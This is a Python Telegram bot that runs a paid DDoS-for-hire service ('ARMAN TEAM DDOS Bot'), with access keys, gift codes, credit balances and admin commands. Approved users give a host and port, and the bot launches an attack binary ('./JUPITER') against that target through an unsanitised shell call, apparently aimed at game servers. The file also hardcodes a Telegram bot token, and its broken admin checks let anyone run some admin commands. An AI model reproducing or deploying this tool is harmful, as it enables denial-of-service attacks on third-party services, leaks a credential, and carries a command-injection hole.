import telebot
import subprocess
import requests
import datetime
import os
import logging
import random
import string
from telebot import types
import threading

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI')

# Initialize the bot
API_TOKEN = '7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI'
bot = telebot.TeleBot(API_TOKEN)

# Owner and admin user IDs
owner_id = "6077036964"
admin_ids = ["6077036964"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")



@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        "🌟 Welcome to the ARMAN TEAM DDOS Bot! 🌟\n\n"
        f"🕒 Current Time: {get_current_time()}\n\n"
        
        "👑 **ADMINS COMMANDS** 👑\n"
        "👤 /approveuser <id> <duration> - Approve a user for a certain duration (day, week, month) (ONLY ADMINS) ✅\n"
        "❌ /removeuser <id> - Remove a user from the bot's access 🚫\n"
        "🔑 /addadmin <id> <balance> - Add an administrator with a starting balance of your choice 💰\n"
        "🚫 /removeadmin <id> - Remove an admin from the list ❌\n\n"

        "👥 **USERS COMMANDS** 👥\n"
        "💰 /checkbalance - Check your balance and see how many resources you have 📊\n"
        "💥 /bgmi <host> <port> <time> - Simulate a DDoS attack (use responsibly! ⚠️)\n"
        "🛑 /stop - Stop the currently running attack if necessary ⏹️\n"
        "💸 /setkeyprice <day/week/month> <price> - Set prices for access keys based on duration (Owner only) 💵\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only) 🎉\n"
        "🎁 /redeem <code> - Redeem a gift code you've received 🎊\n\n"
        
        "✨ Remember, with great power comes great responsibility! ✨\n"
        "🤖 Our bot is here to assist you, but please use responsibly and ethically. 🛡️\n"
        "🚀 Start using the commands listed above and have fun! If you need help, just ask! 🙋‍♂️✨"
    )
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"

    user_info = (
        f"✨ Hey {user.first_name}! Here are your details:\n"
        f"👤 User ID: {user.id}\n"
        f"👍 Username: @{user.username if user.username else 'Not set'}\n"
        f"🌍 First Name: {user.first_name}\n"
        f"🆔 Last Name: {user.last_name if user.last_name else 'Not set'}\n"
        f"📅 Join Date: {message.date}\n"
        f"💌 Chat ID: {message.chat.id}\n"
        f"✔️ Approval Status: {is_approved}\n\n"
        f"Keep shining and have a wonderful day! 🌈✨"
        f"THIS BOT OWNER :- @MR_ARMAN_OWNER"
    )
    
    bot.send_message(message.chat.id, user_info, parse_mode='Markdown')

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]

            if duration not in key_prices:
                response = "🚨 Invalid duration! Use *'day'*, *'week'*, or *'month'*. 🚨"
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(
                days=1 if duration == "day" else 7 if duration == "week" else 30
            )
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")

            # Notify the user being approved
            approval_message = (
                f"🎉✨ Congratulations, *{user_to_approve}*! ✨🎉\n\n"
                f"You have been officially approved for *{duration}* access! 🚀\n"
                "Get ready to enjoy the amazing features! 🎈🎊\n\n"
                "If you have any questions, feel free to reach out! 🤗💬"
                "THIS BOT OWNER :- @MR_ARMAN_OWNER💬"
            )
            bot.send_message(user_to_approve, approval_message)

            response = f"🎉✨ Congratulations, *{user_to_approve}*! ✨🎉\n\nYou have been officially approved for *{duration}* access! 🚀\nGet ready to enjoy the amazing features! 🎈🎊\n\nIf you have any questions, feel free to reach out! 🤗✨\n\nTHIS BOT OWNER :- @MR_ARMAN_OWNER"
        else:
            response = "❗ Usage: /approveuser <id> <duration> ❗"
    else:
        response = "🚫 Only Admin or Owner Can Run This Command! 😡"
    
    bot.send_message(message.chat.id, response)


@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['creategift'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "SORRY YOU DON'T HAVE ANY BALANCE\nPLEASE BUY CREDITS\n\nTHIS BOT OWNER :- @MR_ARMAN_OWNER."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['contact'])
def contact_info(message):
    bot.reply_to(message, "You can contact the owner at: @MR_ARMAN_OWNER ✅")


# Dictionary to store the running status of user's attacks
running_attacks = {}
max_attacks_allowed = 10  # Maximum number of attacks allowed per user
user_attack_limits = {}  # Dictionary to store custom attack limits for users

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"🚀 Attack Sent Successfully! 🚀\n\n🗿𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n💘 PORT {port}\n🕦 Attack Duration: {time}\n💣 Method: KALA JAADU 443 🖤\n\n🔥 Status: Attack in Progress... 🔥 POWERED BY - @MR_ARMAN_OWNER"
    bot.reply_to(message, response)


@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    print(f"Received command from user ID: {user_id}")  # Debug line
    
    # Check if the user is allowed to attack
    if user_id not in allowed_user_ids:
        response = ("🚫 Unauthorized Access! 🚫\n\n"
                    "This command is restricted to authorized personnel only. "
                    "To gain access, please contact an Admin or the Owner. 📩")
    else:
        command = message.text.split()
        
        # Check if the command format is correct
        if len(command) == 3 or (not message.text.startswith('/') and len(command) == 2):
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            try:
                port = int(command[2])  # Attempt to convert port to int
            except ValueError:
                response = "❗ Invalid port number! Please provide a valid port as a number."
                bot.reply_to(message, response)
                return
            
            time = 120  # Default attack time to 120 seconds
            
            # Check if the user has reached the maximum number of attacks
            if user_id in running_attacks and len(running_attacks[user_id]) >= max_attacks_allowed:
                response = "🚫 Maximum Attack Limit Reached! You cannot attack more than 10 times."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                
                if user_id not in running_attacks:
                    running_attacks[user_id] = []

                running_attacks[user_id].append((target, port, time))
                
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time}"
                subprocess.run(full_command, shell=True)

                # Count the user's attacks
                attack_count = len(running_attacks[user_id])
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}\n\nYour attacks: {attack_count}/{max_attacks_allowed}"
        else:
            response = "Please provide the attack in the following format:\n\n<host> <port>"
        
    # Send response to user
    bot.reply_to(message, response)


@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in running_attacks and running_attacks[user_id]:
        target, port, time = running_attacks[user_id].pop()  # Remove the last attack
        # Here, you would add the logic to actually stop the attack subprocess, if applicable
        response = f"Attack stopped! Target: {target} Port: {port} Time: {time}"
    else:
        response = "No attack currently running. Please start an attack first."
    
    bot.reply_to(message, response)

# Dictionary to track ongoing attacks
running_attacks = {}


@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    print(f"Received command from user ID: {user_id}")  # Debug line
    
    # Check if the user is allowed to attack
    if user_id not in allowed_user_ids:
        response = ("🚫 Unauthorized Access! 🚫\n\n"
                    "Oops! It seems like you don't have permission to use the /attack command. "
                    "This command is restricted to authorized personnel only. 🛡️\n\n"
                    "To gain access, please contact an Admin or the Owner. "
                    "Your request will be reviewed, and if approved, you will receive the necessary permissions. 📩\n\n"
                    "In the meantime, here are some helpful commands you can try:\n"
                    "1️⃣ /help - Get a list of available commands\n"
                    "2️⃣ /contact - Check the status of ongoing operations\n"
                    "3️⃣ /myinfo - Learn more about your permissions.\n\n"
                    "Thank you for your understanding! 🙏")
    else:
        command = message.text.split()
        
        # Logic to set time to 120 seconds if not provided
        if len(command) == 3 or (not message.text.startswith('/') and len(command) == 2):
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            
            target = command[1]
            port = int(command[2])
            time = 120  # Default attack time to 120 seconds
            
            # Check if the user has reached the maximum number of attacks
            if user_id in running_attacks and len(running_attacks[user_id]) >= max_attacks_allowed:
                response = "🚫 Maximum Attack Limit Reached! You cannot attack more than 10 times."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                
                if user_id not in running_attacks:
                    running_attacks[user_id] = []

                running_attacks[user_id].append((target, port, time))
                
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time}"
                subprocess.run(full_command, shell=True)

                # Count the user's attacks
                attack_count = len(running_attacks[user_id])
                response = (f"🛡️ Attack Initiated! 🛡️\n"
                            f"Target: {target}\n"
                            f"Port: {port}\n"
                            f"Duration: {time} seconds\n\n"
                            f"Your attacks: {attack_count}/{max_attacks_allowed}")
        else:
            response = "❗ Please provide the attack in the following format:\n\n`<host> <port>`"
        
    # Send response to user
    bot.reply_to(message, response)

@bot.message_handler(commands=['check'])
def check_ports(message):
    response = """\
17500
20001
20002
20003
443

YE SAB WRONG PORT HAI 😂
"""
    bot.send_message(message.chat.id, response)

# message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the FAITH DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
        "🚨 /allusers  : Authorised Users Lists\n"
        "🛑 /clearusers  :- Clear The USERS File\n"
        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
        "Please use these commands responsibly. 😊"
    )

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"


# Start the bot
bot.polling()

